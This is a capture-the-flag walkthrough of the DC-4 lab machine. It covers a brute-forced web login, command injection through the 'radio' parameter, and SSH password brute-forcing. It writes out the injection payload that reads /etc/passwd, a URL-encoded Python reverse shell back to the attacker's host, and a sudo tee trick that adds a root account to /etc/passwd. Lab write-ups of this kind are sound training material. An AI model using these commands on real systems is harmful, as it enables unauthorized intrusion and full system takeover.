DC-4

Target IP: 192.168.186.195

Scanning


Only two ports are open on the target machine: SSH and HTTP.

Enumeration

Port 80: HTTP

The application on port 80 displays the webpage above. Doing a directory search against does not reveal anything useful. Trying default credentials did not work either. Looks like the only entry point is through bruteforcing this login form.

Exploitation

I fired up Burp Suite and used the Intruder mode to perform bruteforcing. Loading up rockyou.txt is not possible on my machine, so I went with smaller passwords lists. The one I had success with is best1050.txt from seclists. Now I have the login admin:happy.


After logging in, the webpage above is shown. The section "Command" under "System Tools" is interesting.


There are three commands that can be performed on the target machine.


After enumerating for some time with the three commands, I find List Files the most interesting. Intercepting the request shows an interesting parameter name called radio. Maybe I can perform command injection using this parameter.


The target machine is vulnerable to command injection. There is no filtering in place, as I am able to use ; to separate the different commands for the host to execute. The picture above shows the output after the host executes id;whoami;cat+/etc/passwd as the payload. Trying to obtain the SSH keys of the different users miguel, sam, and jim did not work.


Sending the payload whereis+python shows if Python is displayed on the target machine or not. Doing this will help which payload to use for reverse shell connection.


And now I have a reverse shell connection from the target machine on my local port 8443. I used the Python payload below.
Python payload used: python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.45.195%22%2C8443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27.

Privilege Escalation


There is an interesting directory called backups. This directory contains a file called old-passwords.bak which contains a wordlist of passwords. Another interesting file is the test.sh which is owned by the user jim. Maybe I can bruteforce the SSH password of user jim?


And it worked. I now have the SSH password of user jim.




Apparently this user has a new mail. This new mail contains the password ^xHhA&hvim0y of the user charles. Using this new password, I managed to switch user to charles.



There is an interesting binary that can be executed by root called teehee. Searching this binary in GTFOBins shows it is tee and I have write permission over it.


And using the command echo 'super2:ZDDDszmf2Ef0A:0:0:root:/root:/bin/bash' | sudo /usr/bin/teehee -a "$LFILE", I created a new user called super2 with root privileges. The password of this new user is rooted.

Flags


The local.txt flag once I gained a foothold on the machine. This flag file is located at /home/jim.


The proof.txt flag once I used /usr/bin/teehee binary to write a new user to /etc/passwd file.
